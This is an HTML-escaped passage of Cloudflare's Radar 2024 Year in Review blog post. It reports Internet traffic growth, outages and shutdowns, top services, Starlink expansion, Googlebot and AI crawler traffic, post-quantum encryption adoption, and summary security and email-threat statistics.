        &lt;ul&gt;&lt;li&gt;&lt;p&gt;6.5% of global traffic was mitigated by Cloudflare's systems as being potentially malicious or for customer-defined reasons. In the United States, the share of mitigated traffic grew to 5.1%, while in South Korea, it dropped slightly to 8.1%. In 44 countries/regions, over 10% of traffic was mitigated. &lt;a href="https://blog.cloudflare.com/tag/security/rss#6-5-of-global-traffic-was-mitigated-by-cloudflares-systems-as-being-potentially-malicious-or-for-customer-defined-reasons"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;The United States was responsible for over a third of global bot traffic. Amazon Web Services was responsible for 12.7% of global bot traffic, and 7.8% came from Google. &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-united-states-was-responsible-for-over-a-third-of-global-bot-traffic-amazon-web-services-was-responsible-for-12-7-of-global-bot-traffic-and-7-8-came-from-google"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Globally, Gambling/Games was the most attacked industry, slightly ahead of 2023’s most targeted industry, Finance. &lt;a href="https://blog.cloudflare.com/tag/security/rss#globally-gambling-games-was-the-most-attacked-industry-slightly-ahead-of-2023s-most-targeted-industry-finance"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Log4j, a vulnerability discovered in 2021, remains a persistent threat and was actively targeted throughout 2024. &lt;a href="https://blog.cloudflare.com/tag/security/rss#log4j-remains-a-persistent-threat-and-was-actively-targeted-throughout-2024"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Routing security, measured as the share of RPKI valid routes and the share of covered IP address space, continued to improve globally throughout 2024. We saw a 4.7% increase in RPKI valid IPv4 address space in 2024, and a 6.4% increase in RPKI valid routes in 2024. &lt;a href="https://blog.cloudflare.com/tag/security/rss#routing-security-measured-as-the-share-of-rpki-valid-routes-and-the-share-of-covered-ip-address-space-continued-to-improve-globally-throughout-2024"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;

          &lt;/div&gt;
        &lt;ul&gt;&lt;li&gt;&lt;p&gt;An average of 4.3% of emails were determined to be malicious in 2024, although this figure was likely influenced by spikes observed in March, April, and May. Deceptive links and identity deception were the two most common types of threats found in malicious email messages. &lt;a href="https://blog.cloudflare.com/tag/security/rss#an-average-of-4-3-of-emails-were-determined-to-be-malicious-in-2024"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Over 99% of the email messages processed by Cloudflare Email Security from the .bar, .rest, and .uno top level domains (TLDs) were found to be either spam or malicious in nature. &lt;a href="https://blog.cloudflare.com/tag/security/rss#over-99-of-the-email-messages-processed-by-cloudflare-email-security-from-the-bar-rest-and-uno-top-level-domains-tlds-were-found-to-be-either-spam-or-malicious-in-nature"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;

          &lt;p&gt;Over the last four years (&lt;a href="https://blog.cloudflare.com/cloudflare-radar-2020-year-in-review/"&gt;&lt;u&gt;2020&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/cloudflare-radar-2021-year-in-review/"&gt;&lt;u&gt;2021&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/radar-2022-year-in-review/"&gt;&lt;u&gt;2022&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/radar-2023-year-in-review/"&gt;&lt;u&gt;2023&lt;/u&gt;&lt;/a&gt;), we have aggregated perspectives from &lt;a href="https://radar.cloudflare.com/"&gt;&lt;u&gt;Cloudflare Radar&lt;/u&gt;&lt;/a&gt; into an annual Year In Review, illustrating the Internet’s patterns across multiple areas over the course of that year. The &lt;a href="https://radar.cloudflare.com/year-in-review/2024"&gt;&lt;u&gt;Cloudflare Radar 2024 Year In Review&lt;/u&gt;&lt;/a&gt; microsite continues that tradition, featuring interactive charts, graphs, and maps you can use to explore and compare notable Internet trends observed throughout this past year.&lt;/p&gt;&lt;p&gt;Cloudflare’s &lt;a href="https://www.cloudflare.com/network"&gt;&lt;u&gt;network&lt;/u&gt;&lt;/a&gt; currently spans more than 330 cities in over 120 countries/regions, serving an average of over 63 million HTTP(S) requests per second for millions of Internet properties, in addition to handling over 42 million DNS requests per second on average. The resulting data generated by this usage, combined with data from other complementary Cloudflare tools, enables Radar to provide unique near-real time perspectives on the patterns and trends around security, traffic, performance, and usage that we observe across the Internet. &lt;/p&gt;&lt;p&gt;The 2024 Year In Review is organized into five sections: &lt;a href="https://radar.cloudflare.com/year-in-review/2024#traffic"&gt;&lt;u&gt;Traffic&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024#adoption-and-usage"&gt;&lt;u&gt;Adoption &amp;amp; Usage&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024#connectivity"&gt;&lt;u&gt;Connectivity&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024#security"&gt;&lt;u&gt;Security&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024#email-security"&gt;&lt;u&gt;Email Security&lt;/u&gt;&lt;/a&gt; and covers the period from January 1 to December 1, 2024. We have incorporated several new metrics this year, including AI bot &amp;amp; crawler traffic, search engine and browser market share, connection tampering, and “most dangerous” top level domains (TLDs). To ensure consistency, we have kept underlying methodologies consistent with previous years’ calculations. Trends for 200 countries/regions are available on the microsite; smaller or less populated locations are excluded due to insufficient data. Some metrics are only shown worldwide, and are not displayed if a country/region is selected. &lt;/p&gt;&lt;p&gt;Below, we provide an overview of the content contained within the major Year In Review sections (Traffic, Adoption &amp;amp; Usage, Connectivity, Security, and Email Security), along with notable observations and key findings. In addition, we have also published a companion blog post that specifically explores trends seen across &lt;a href="https://blog.cloudflare.com/radar-2024-year-in-review-internet-services/"&gt;&lt;u&gt;Top Internet Services&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;The key findings and associated discussion within this post only provide a high-level perspective on the unique insights that can be found in the &lt;a href="https://radar.cloudflare.com/year-in-review/2024"&gt;&lt;u&gt;Year in Review microsite&lt;/u&gt;&lt;/a&gt;. Visit the microsite to explore the various datasets and metrics in more detail, including trends seen in your country/region, how these trends have changed as compared to 2023, and how they compare to other countries/regions of interest. Surveying the Internet from this vantage point provides insights that can inform decisions on everything from an organization’s security posture and IT priorities to product development and strategy. &lt;/p&gt;

          &lt;/div&gt;
        &lt;p&gt;An inflection point for Internet traffic arguably occurred thirty years ago. The World Wide Web went mainstream in 1994, thanks to the late 1993 &lt;a href="https://cybercultural.com/p/1993-mosaic-launches-and-the-web-is-set-free/"&gt;&lt;u&gt;release&lt;/u&gt;&lt;/a&gt; of the &lt;a href="https://www.ncsa.illinois.edu/research/project-highlights/ncsa-mosaic/"&gt;&lt;u&gt;NCSA Mosaic&lt;/u&gt;&lt;/a&gt; browser for multiple popular operating systems, which included support for embedded images. In turn, “heavier” (in contrast to text-based) Internet content became the norm, and coupled with the growth in consumption through popular online services and the emerging consumer ISP industry, &lt;a href="https://blogs.cisco.com/sp/the-history-and-future-of-internet-traffic"&gt;&lt;u&gt;Internet traffic began to rapidly increase&lt;/u&gt;&lt;/a&gt;, and that trend has continued to the present.&lt;/p&gt;&lt;p&gt;To determine the traffic trends over time for the Year in Review, we use the average daily traffic volume (excluding bot traffic) over the second full calendar week (January 8-15) of 2024 as our baseline. (The second calendar week is used to allow time for people to get back into their “normal” school and work routines after the winter holidays and New Year’s Day. The percent change shown in the traffic trends chart is calculated relative to the baseline value — it does not represent absolute traffic volume for a country/region. The trend line represents a seven-day trailing average, which is used to smooth the sharp changes seen with data at a daily granularity. To compare 2024’s traffic trends with 2023 data and/or other locations, click the “Compare” icon at the upper right of the graph.&lt;/p&gt;&lt;p&gt;Throughout the first half of 2024, &lt;a href="https://radar.cloudflare.com/year-in-review/2024#internet-traffic-growth"&gt;&lt;u&gt;worldwide Internet traffic growth&lt;/u&gt;&lt;/a&gt; appeared to be fairly limited, within a percent or two on either side of the baseline value through mid-August. However, at that time growth clearly began to accelerate, climbing consistently through the end of November, growing 17.2% for the year. This trend is similar to those also seen in 2023 and 2022, as we discussed in the &lt;a href="https://blog.cloudflare.com/radar-2023-year-in-review/"&gt;&lt;u&gt;2023 Year in Review blog post&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5NjOCs902pW74OQ0bx2usy/58896c0bc06b4a9c819736bde28ed3f4/traffic_-_worldwide.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Internet traffic trends in 2024, worldwide&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;The West African country of &lt;a href="https://radar.cloudflare.com/year-in-review/2024/gn?previousYear=true"&gt;&lt;u&gt;Guinea&lt;/u&gt;&lt;/a&gt; experienced the most significant Internet traffic growth seen in 2024, reaching as much as 350% above baseline. Traffic growth didn’t begin in earnest until late February, and reached an initial peak in early April. It remained between 100% and 200% above baseline until September, when it experienced several multi-week periods of growth. While the September-November periods of traffic growth also occurred in 2023, they peaked at under 90% above baseline.&lt;/p&gt;&lt;p&gt;The impact of significant Internet outages is also clearly visible when looking at data across the year. Two significant Internet outages in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/cu#internet-traffic-growth"&gt;&lt;u&gt;Cuba&lt;/u&gt;&lt;/a&gt; are clearly visible as large drops in traffic in October and November. A reported “complete disconnection” of the national electricity system on the island &lt;a href="https://x.com/CloudflareRadar/status/1847325224208891950"&gt;&lt;u&gt;occurred on October 18&lt;/u&gt;&lt;/a&gt;, lasting &lt;a href="https://x.com/CloudflareRadar/status/1848680148813406474"&gt;&lt;u&gt;just over three days&lt;/u&gt;&lt;/a&gt;. Just a couple of weeks later, on November 6, &lt;a href="https://x.com/CloudflareRadar/status/1854291286322544752"&gt;&lt;u&gt;damage from Hurricane Rafael caused widespread power outages in Cuba&lt;/u&gt;&lt;/a&gt;, resulting in another large drop in Internet traffic. Traffic has remained lower as Cuba’s electrical infrastructure &lt;a href="https://x.com/CloudflareRadar/status/1864263679442567604"&gt;&lt;u&gt;continues to struggle&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2rvK8AFYdcJAgQhJQUTiQw/8c4790fd06af8323636878977a9d712c/traffic_-_Cuba.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Internet traffic trends in 2024, Cuba&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;As we frequently discuss in Cloudflare Radar blog and social media posts, government-directed Internet shutdowns occur all too frequently, and the impact of these actions are also clearly visible when looking at long-term traffic data. In &lt;a href="https://radar.cloudflare.com/year-in-review/2024/bd#internet-traffic-growth"&gt;&lt;u&gt;Bangladesh&lt;/u&gt;&lt;/a&gt;, the government ordered the &lt;a href="https://blog.cloudflare.com/q3-2024-internet-disruption-summary/#bangladesh"&gt;&lt;u&gt;shutdown of mobile Internet connectivity&lt;/u&gt;&lt;/a&gt; on July 18, in response to student protests. Shortly after mobile networks were shut down, fixed broadband networks were taken offline as well, resulting in a near complete loss of Internet traffic from the country. Connectivity gradually returned over the course of several days, between July 23-28.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5FvubyG6qMeZ9hv1wgFayl/91d356b23788a8f9cdd970cc7e65f8fc/traffic_-_Bangladesh.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Internet traffic trends in 2024, Bangladesh&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;As we also noted last year, the celebration of major holidays can also have a visible impact on Internet traffic at a country level. For example, in Muslim countries including &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ae?compareWith=ID#internet-traffic-growth"&gt;&lt;u&gt;Indonesia and the United Arab Emirates&lt;/u&gt;&lt;/a&gt;, the celebration of Eid al-Fitr, the festival marking the end of the fast of Ramadan, is visible as a noticeable drop in traffic around April 9-10. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/aFTFP2banlfW65XkjUIZM/84bfd5db1036da1b4740843575217113/traffic_-_UAE_Indonesia.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Internet traffic trends in 2024, Indonesia and United Arab Emirates&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Google maintained its position as the most popular Internet service. OpenAI, Binance, WhatsApp, and Facebook led their respective categories. &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#google-maintained-its-position-as-the-most-popular-internet-service-openai-binance-whatsapp-and-facebook-led-their-respective-categories"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Over the last several years, the Year In Review has ranked the &lt;a href="https://radar.cloudflare.com/year-in-review/2024#internet-services"&gt;&lt;u&gt;most popular Internet services&lt;/u&gt;&lt;/a&gt;. These rankings cover an “overall” perspective, as well as a dozen more specific categories, based on analysis of anonymized query data of traffic to our &lt;a href="https://1.1.1.1/dns"&gt;&lt;u&gt;1.1.1.1 public DNS resolver&lt;/u&gt;&lt;/a&gt; from millions of users around the world. For the purposes of these rankings, domains that belong to a single Internet service are grouped together.&lt;/p&gt;&lt;p&gt;Google once again held the top spot overall, supported by its broad portfolio of services, as well as the popularity of the Android mobile operating system (more on that &lt;a href="https://blog.cloudflare.com/tag/security/rss#globally-nearly-one-third-of-mobile-device-traffic-was-from-apple-ios-devices-android-had-a-90-share-of-mobile-device-traffic-in-29-countries-regions-peak-ios-mobile-device-traffic-share-was-over-60-in-eight-countries-regions"&gt;&lt;u&gt;below&lt;/u&gt;&lt;/a&gt;). Meta properties Facebook, Instagram, and WhatsApp also held spots in the top 10.&lt;/p&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/learning/ai/what-is-generative-ai/"&gt;&lt;u&gt;Generative AI&lt;/u&gt;&lt;/a&gt; continued to grow in popularity throughout 2024, and in this category, OpenAI again held the top spot, building on the continued success and popularity of ChatGPT. Within Social Media, the top five remained consistent with 2023’s and 2022’s ranking, including Facebook, TikTok, Instagram, X, and Snapchat.&lt;/p&gt;&lt;p&gt;These categorical rankings, as well as trends seen by specific services, are explored in more detail in a separate blog post, &lt;a href="https://blog.cloudflare.com/radar-2024-year-in-review-internet-services/"&gt;&lt;i&gt;&lt;u&gt;From ChatGPT to Temu: ranking top Internet services in 2024&lt;/u&gt;&lt;/i&gt;&lt;/a&gt;.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Global traffic from Starlink grew 3.3x in 2024, in line with last year’s growth rate. After initiating service in Malawi in July 2023, Starlink traffic from that country grew 38x in 2024.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#global-traffic-from-starlink-grew-3-3x-in-2024-in-line-with-last-years-growth-rate-after-initiating-service-in-malawi-in-july-2023-starlink-traffic-from-that-country-grew-38x-in-2024"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;SpaceX’s Starlink continues to be the leading satellite Internet service provider, bringing connectivity to unserved or underserved areas. In addition to opening up new markets in 2024, Starlink also announced relationships to provide in-flight connectivity to &lt;a href="https://www.cnbc.com/2024/09/17/spacexs-starlink-has-2500-aircraft-under-contract.html"&gt;&lt;u&gt;multiple airlines&lt;/u&gt;&lt;/a&gt;, and on &lt;a href="https://x.com/Starlink/status/1790426484022342081"&gt;&lt;u&gt;cruise ships&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://x.com/Starlink/status/1857166233969607123"&gt;&lt;u&gt;trains&lt;/u&gt;&lt;/a&gt;, as well as enabling subscribers to roam with their subscription using the &lt;a href="https://www.theverge.com/2024/7/11/24196294/starlink-mini-available-us-price-specs"&gt;&lt;u&gt;Starlink Mini&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;We analyzed aggregate Cloudflare traffic volumes associated with Starlink's primary &lt;a href="https://www.cloudflare.com/learning/network-layer/what-is-an-autonomous-system/"&gt;&lt;u&gt;autonomous system&lt;/u&gt;&lt;/a&gt; (&lt;a href="https://radar.cloudflare.com/as14593"&gt;&lt;u&gt;AS14593&lt;/u&gt;&lt;/a&gt;) to track the growth in usage of the service throughout 2024. Similar to the traffic trends discussed above, the request volume shown on the trend line in the chart represents a seven-day trailing average. Comparisons with 2023 data can be shown by clicking the “Compare” icon at the upper right of the graph. Within comparative views, the lines are scaled to the maximum value shown.&lt;/p&gt;&lt;p&gt;On a &lt;a href="https://radar.cloudflare.com/year-in-review/2024#starlink-traffic.trends"&gt;&lt;u&gt;worldwide&lt;/u&gt;&lt;/a&gt; basis, steady, consistent growth was seen across the year, though it accelerates throughout November. This acceleration may have been driven by traffic associated with customer-specific large software updates. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6Dy2qt4O5b3MCswkckhELA/aa29c7235497bed8c985aa9dd9b63477/traffic_-_Starlink_worldwide.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Starlink traffic growth worldwide in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;In many locations, there is pent-up demand for “alternative” connectivity providers such as Starlink, and in these countries/regions, we see rapid traffic growth when service becomes available, such as in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/zw#starlink-traffic.trends"&gt;&lt;u&gt;Zimbabwe&lt;/u&gt;&lt;/a&gt;. Service availability was &lt;a href="https://x.com/Starlink/status/1832392080481563037"&gt;&lt;u&gt;announced on September 7&lt;/u&gt;&lt;/a&gt;, and traffic from the country began to grow rapidly almost immediately thereafter.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1aLywcrB5w88flsDyK1R1q/1039d989e19dc566cf5f62e60f3f1886/traffic_-_Starlink_Zimbabwe.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Starlink traffic growth in Zimbabwe in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;In new markets, traffic growth continues after that initial increase. For example Starlink service became available in Malawi &lt;a href="https://x.com/Starlink/status/1683897037639790592"&gt;&lt;u&gt;in July 2023&lt;/u&gt;&lt;/a&gt;, and throughout 2024, Starlink traffic from the country grew 38x. While &lt;a href="https://radar.cloudflare.com/year-in-review/2024/mw#starlink-traffic.trends"&gt;&lt;u&gt;Malawi’s 38x increase&lt;/u&gt;&lt;/a&gt; is impressive, other countries also experienced significant growth. In the Eastern European country of &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ge#starlink-traffic.trends"&gt;&lt;u&gt;Georgia&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://x.com/Starlink/status/1719581885200998485"&gt;&lt;u&gt;service became available on November 1, 2023&lt;/u&gt;&lt;/a&gt;. After a slow ramp, traffic began to take off growing over 100x through 2024. In &lt;a href="https://radar.cloudflare.com/year-in-review/2024/py#starlink-traffic.trends"&gt;&lt;u&gt;Paraguay&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://x.com/Starlink/status/1737914318522581489"&gt;&lt;u&gt;service availability was announced on December 21&lt;/u&gt;&lt;/a&gt;, and began to grow at the beginning of January, registering an increase of over 900x across the year.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6AXOON7CO7XgnWSNnezoiF/bd56192d682c574a2d242845bb0eda16/traffic_-_Starlink_Malawi.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Starlink traffic growth in Malawi in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Googlebot was responsible for the highest volume of request traffic to Cloudflare in 2024 as it retrieved content from millions of Cloudflare customer sites for search indexing. &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#googlebot-was-responsible-for-the-highest-volume-of-request-traffic-to-cloudflare-in-2024-as-it-retrieved-content-from-millions-of-cloudflare-customer-sites-for-search-indexing"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Cloudflare Radar shows users Internet traffic trends over a selected period of time, but at a country/region or network level. However, &lt;a href="https://blog.cloudflare.com/radar-2023-year-in-review/#googlebot-was-responsible-for-the-highest-volume-of-request-traffic-to-cloudflare-in-2023"&gt;&lt;u&gt;as we did in 2023&lt;/u&gt;&lt;/a&gt;, we again wanted to look at the traffic Cloudflare saw over the course of the full year from the entire IPv4 Internet. To do so, we can use &lt;a href="https://en.wikipedia.org/wiki/Hilbert_curve"&gt;&lt;u&gt;Hilbert curves&lt;/u&gt;&lt;/a&gt;, which allow us to visualize a sequence of IPv4 addresses in a two-dimensional pattern that keeps nearby IP addresses close to each other, making them &lt;a href="https://xkcd.com/195/"&gt;&lt;u&gt;useful&lt;/u&gt;&lt;/a&gt; for surveying the Internet's IPv4 address space.&lt;/p&gt;&lt;p&gt;Using a Hilbert curve, we can &lt;a href="https://radar.cloudflare.com/year-in-review/2024#ipv4-traffic-distribution"&gt;&lt;u&gt;visualize aggregated IPv4 request traffic to Cloudflare&lt;/u&gt;&lt;/a&gt; from January 1 through December 1, 2024. Within the visualization, we aggregate IPv4 addresses at a &lt;a href="https://www.ripe.net/about-us/press-centre/IPv4CIDRChart_2015.pdf"&gt;&lt;u&gt;/20&lt;/u&gt;&lt;/a&gt; level, meaning that at the highest zoom level, each square represents traffic from 4,096 IPv4 addresses. This aggregation is done to keep the amount of data used for the visualization manageable. (While we would like to create a similar visualization for IPv6 traffic, the enormity of the full IPv6 address space would make associated traffic very &lt;a href="https://observablehq.com/@vasturiano/hilbert-map-of-ipv6-address-space"&gt;&lt;u&gt;hard to see&lt;/u&gt;&lt;/a&gt; in such a visualization, especially as such a small amount has been &lt;a href="https://www.iana.org/numbers/allocations/"&gt;&lt;u&gt;allocated for assignment by the Regional Internet Registries&lt;/u&gt;&lt;/a&gt;.)&lt;/p&gt;&lt;p&gt;Within the visualization, IP addresses are grouped by ownership, and for much of the IP address space shown there, a mouseover at the default zoom level will show the &lt;a href="https://www.nro.net/about/rirs/"&gt;&lt;u&gt;Regional Internet Registry (RIR)&lt;/u&gt;&lt;/a&gt; that the address block belongs to. However, there are also a number of blocks that were assigned prior to the existence of the RIR system, and for these, they are labeled with the name of the organization that owns them. Progressive zooming ultimately shows the autonomous system and country/region that the IP address block is associated with, as well as its share of traffic relative to the maximum. (If a country/region is selected, only the IP address blocks associated with that location are visible.) Overall traffic shares are indicated by shading based on a color scale, and although a number of large unshaded blocks are visible, this does not necessarily mean that the associated address space is unused, but rather that it may be used in a way that does not generate traffic to Cloudflare.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6gtrL1H2gUjSKH7AMSabgM/361d38f34860258449a914e26519a4b4/traffic_-_Hilbert_curve.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Hilbert curve showing aggregated 2024 traffic to Cloudflare across the IPv4 Internet&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Warmer orange/red shading within the visualization represents areas of higher request volume, and buried within one of those areas is the IP address block that had the maximum request volume to Cloudflare during 2024. As it was in 2023, this address block was &lt;a href="https://radar.cloudflare.com/routing/prefix/66.249.64.0/20"&gt;&lt;u&gt;66.249.64.0/20&lt;/u&gt;&lt;/a&gt;, which belongs to Google, and is &lt;a href="https://developers.google.com/static/search/apis/ipranges/googlebot.json"&gt;&lt;u&gt;one of several&lt;/u&gt;&lt;/a&gt; used by the &lt;a href="https://developers.google.com/search/docs/crawling-indexing/googlebot"&gt;&lt;u&gt;Googlebot&lt;/u&gt;&lt;/a&gt; web crawler to retrieve content for search indexing. This use of that address space is a likely explanation for the high request volume, given the number of web properties on Cloudflare’s network.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/g5rQhT7r4DsgpzYdMT3QT/0d6809d96791ee7165ada170d24156e3/traffic_-_Hilbert_curve_Googlebot.png" /&gt;

            &lt;h3&gt;Among AI bots and crawlers, Bytespider (ByteDance) traffic gradually declined over the course of 2024, while ClaudeBot (Anthropic) was more active during the back half of the year.&lt;/h3&gt;

          &lt;/div&gt;
        &lt;p&gt;AI bots and crawlers have been in the news throughout 2024 as they voraciously consume content to train ever-evolving models. Controversy has followed them, as not all bots and crawlers respect content owner directives to restrict crawling activity. In July, Cloudflare enabled customers to &lt;a href="https://blog.cloudflare.com/declaring-your-aindependence-block-ai-bots-scrapers-and-crawlers-with-a-single-click/"&gt;&lt;u&gt;block these bots and crawlers with a single click&lt;/u&gt;&lt;/a&gt;, and during Birthday Week &lt;a href="https://blog.cloudflare.com/cloudflare-ai-audit-control-ai-content-crawlers/"&gt;&lt;u&gt;we introduced AI Audit&lt;/u&gt;&lt;/a&gt; to give website owners even more visibility into and control over how AI platforms access their content. &lt;/p&gt;&lt;p&gt;Tracking traffic trends for AI bots can help us better understand their activity over time — observing which are the most aggressive and have the highest volume of requests, which perform crawls on a regular basis, etc. The new &lt;a href="https://radar.cloudflare.com/traffic#ai-bot-crawler-traffic"&gt;&lt;u&gt;AI bot &amp;amp; crawler traffic graph on Radar’s Traffic page&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/bringing-ai-to-cloudflare/#ai-bot-traffic-insights-on-cloudflare-radar"&gt;&lt;u&gt;launched in September&lt;/u&gt;&lt;/a&gt;, provides insight into these traffic trends gathered over the selected time period for the top known AI bots. &lt;/p&gt;&lt;p&gt;&lt;a href="https://radar.cloudflare.com/year-in-review/2024#ai-bot-and-crawler-traffic"&gt;&lt;u&gt;Looking at traffic trends&lt;/u&gt;&lt;/a&gt; from two of those bots, we can see some interesting patterns. &lt;a href="https://darkvisitors.com/agents/bytespider"&gt;&lt;u&gt;Bytespider&lt;/u&gt;&lt;/a&gt; is a crawler operated by ByteDance, the Chinese owner of TikTok, and is reportedly used to download training data for ByteDance’s Large Language Models (LLMs). Bytespider’s crawling activity trended generally downwards over the course of 2024, with end-of-November activity approximately 80-85% lower than that seen at the start of the year. &lt;a href="https://darkvisitors.com/agents/claudebot"&gt;&lt;u&gt;ClaudeBot&lt;/u&gt;&lt;/a&gt; is Anthropic’s crawler, which downloads training data for its LLMs that power AI products like Claude. Traffic from ClaudeBot appeared to be mostly non-existent through mid-April, except for some small spikes that possibly represent test runs. Traffic became more consistently non-zero starting in late April, but after an early spike, trailed off through the remainder of the year.&lt;/p&gt;
          &lt;figure&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Traffic trends for AI crawlers Bytespider and ClaudeBot in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Traffic trends for the full list of AI bots &amp;amp; crawlers can be found in the &lt;a href="https://radar.cloudflare.com/explorer?dataSet=ai.bots&amp;amp;dt=2024-01-01_2024-12-31"&gt;&lt;u&gt;Cloudflare Radar Data Explorer&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;

            &lt;h3&gt;13.0% of TLS 1.3 traffic is using post-quantum encryption.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#13-0-of-tls-1-3-traffic-is-using-post-quantum-encryption"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The term “&lt;a href="https://en.wikipedia.org/wiki/Post-quantum_cryptography"&gt;&lt;u&gt;post-quantum&lt;/u&gt;&lt;/a&gt;” refers to a new set of cryptographic techniques designed to protect data from adversaries that have the ability to capture and store current data for decryption by sufficiently powerful quantum computers in the future. The Cloudflare Research team has been &lt;a href="https://blog.cloudflare.com/sidh-go/"&gt;&lt;u&gt;exploring post-quantum cryptography since 2017&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;In October 2022, we enabled &lt;a href="https://blog.cloudflare.com/post-quantum-for-all/"&gt;&lt;u&gt;post-quantum key agreement&lt;/u&gt;&lt;/a&gt; on our network by default, but use of it requires that browsers and clients support it as well. In 2024, Google's &lt;a href="https://developer.chrome.com/release-notes/124"&gt;&lt;u&gt;Chrome 124&lt;/u&gt;&lt;/a&gt; enabled it by default on April 17, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024#post-quantum-encryption"&gt;&lt;u&gt;adoption grew rapidly following that release&lt;/u&gt;&lt;/a&gt;, increasing from just over 2% of requests to around 12% within a month, and ended November at 13%. We expect that adoption will continue to grow into and during 2025 due to support in other Chromium-based browsers, growing default support in Mozilla Firefox, and initial testing in Apple Safari.&lt;/p&gt;
          &lt;figure&gt;
